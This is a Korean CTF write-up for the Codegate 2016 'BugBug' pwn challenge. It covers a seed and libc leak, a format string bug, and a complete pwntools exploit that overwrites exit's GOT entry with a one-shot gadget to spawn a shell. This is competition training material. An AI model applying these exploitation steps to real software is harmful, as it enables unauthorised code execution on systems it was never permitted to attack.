# [2016_CODEGATE] BugBug

### 메모리 보호 기법

```
root@inj3ct:~/labs/ctf/codegate_quals_2016/BugBug# checksec bugbug 
[*] '/root/labs/ctf/codegate_quals_2016/BugBug/bugbug'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



### 취약점1 - Seed Leak

```c
  unsigned int v0; // eax@1
  unsigned int v1; // eax@3
  int result; // eax@12
  int v3[6]; // [sp+4h] [bp-A4h]@4
  int v4[6]; // [sp+1Ch] [bp-8Ch]@2
  char buf; // [sp+34h] [bp-74h]@5
  unsigned int ptr; // [sp+98h] [bp-10h]@5
  FILE *stream; // [sp+9Ch] [bp-Ch]@5

  v0 = 0;
  do
  {
    v4[v0] = 0;
    ++v0;
  }
  while ( v0 < 6 );
  v1 = 0;
  do
  {
    v3[v1] = 0;
    ++v1;
  }
  while ( v1 < 6 );
  setvbuf(stdout, 0, 2, 0);
  stream = fopen("/dev/urandom", "rb");
  fread(&ptr, 4u, 1u, stream);
  fclose(stream);
  srand(ptr);
  printf("\nWho are you? ");
  read(0, &buf, 0x64u);
  printf("\nHello~ %s\n", &buf);
```

buf에 0x64만큼의 값을 memory leak이 발생합니다. 랜덤의 seed 값을 알아낼 수 있고 이를 통해 libc의 base도 구할 수 있습니다.



### 취약점2 - Format String Bug

```c
  if ( result )
  {
    printf("Congratulation, ");
    printf(&buf);
    puts("You Win!!\n");
    exit(0);
  }
```

FSB가 발생합니다.



### Exploit 시나리오

1. Seed값과 libc의 값을 알아낸다.
2. Random 값을 알아내서 FSB가 발생하는 루틴으로 들어간다.
   - FSB가 발생하면 exit의 got를 덮어씌우면 되는데 릭된 libc의 값을 format string에 작성할 수 없다.
   - format string을 입력받고 난 후에야 libc값이 노출되기 때문이다. 즉, 한번만으로는 shell을 획득할 수가 없다.
3. exit의 got를 format string을 입력받는 곳으로 조작한다.
4. 릭된 libc base 값을 통해 one-shot gadget의 위치를 계산한 후, format string을 입력한다.
5. 다시 랜덤 값을 알아낸 후 FSB가 발생하는 루틴으로 들어가면 Exploit된다.



### Code

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
	puts(argv[1]);
	srand(atoi(argv[1]));
	printf("%d\n", rand()%45+1);
        printf("%d\n", rand()%45+1);
        printf("%d\n", rand()%45+1);
        printf("%d\n", rand()%45+1);
        printf("%d\n", rand()%45+1);
        printf("%d\n", rand()%45+1);
	
        printf("%d\n", rand()%45+1);
        printf("%d\n", rand()%45+1);
        printf("%d\n", rand()%45+1);
        printf("%d\n", rand()%45+1);
        printf("%d\n", rand()%45+1);
        printf("%d\n", rand()%45+1);
	return 0;
} 
```

랜덤 값을 알아내는 C 파일



```
from pwn import *
import subprocess

def randomNo(randomNumber):
	r = process(["./rand",str(randomNumber)])
	r.recvline()[:-1]
	payload = ""
	payload += r.recvline()[:-1] + " "
	payload += r.recvline()[:-1] + " "
	payload += r.recvline()[:-1] + " "
	payload += r.recvline()[:-1] + " "
	payload += r.recvline()[:-1] + " "
	payload += r.recvline()[:-1] + " "

	payload2 =""
	payload2 += r.recvline()[:-1] + " "
        payload2 += r.recvline()[:-1] + " "
        payload2 += r.recvline()[:-1] + " "
        payload2 += r.recvline()[:-1] + " "
        payload2 += r.recvline()[:-1] + " "
        payload2 += r.recvline()[:-1] + " "
	r.close()
	return [payload,payload2]

p = process("./bugbug")
context.clear(arch='i386')

# first overwirte : For leaking libc base
fm=fmtstr_payload(17,{0x0804a024:0x08048843},write_size='byte')
payload = ""
payload+=fm
payload+="a"*(0x64-len(payload))

p.recv()
p.sendline(payload)
p.recvuntil(payload)
leaked = p.recv()
randomNumber = u32(leaked[0:4])
libcbase = u32(leaked[8:12])-(0xf76c53dc-0xf7513000)

log.info("random no : "+str(randomNumber))
log.info("libc base : "+hex(libcbase))

payload,payload2 = randomNo(randomNumber)
p.sendline(payload)
print p.recv()


# second overwrite : exploit
oneshot = libcbase+0x5fbc6
log.info("one-shot gadget : " +hex(oneshot))
fm=fmtstr_payload(19,{0x0804a024:oneshot},write_size='byte')
payload = ""
payload+=fm
payload+="a"*(0x64-len(payload))

p.sendline(payload)
p.recv()
p.sendline(payload2)
p.interactive()
```

익스플로잇 코드